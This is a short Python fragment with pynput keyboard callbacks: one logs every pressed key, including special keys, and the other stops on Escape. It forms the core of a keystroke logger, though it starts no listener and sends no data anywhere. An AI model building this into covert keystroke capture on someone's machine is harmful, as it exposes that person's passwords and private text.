from pynput.keyboard import Key # type: ignore
import logging

def on_press(key):
    try:
        # Log regular alphanumeric keys
        logging.info(str(key))
    except AttributeError:
        # Log special keys (like space, enter, shift)
        logging.info("Special Key: {0}".format(key))

def on_release(key):
    # Stop the listener if the Escape key is pressed
    if key == Key.esc:
        return False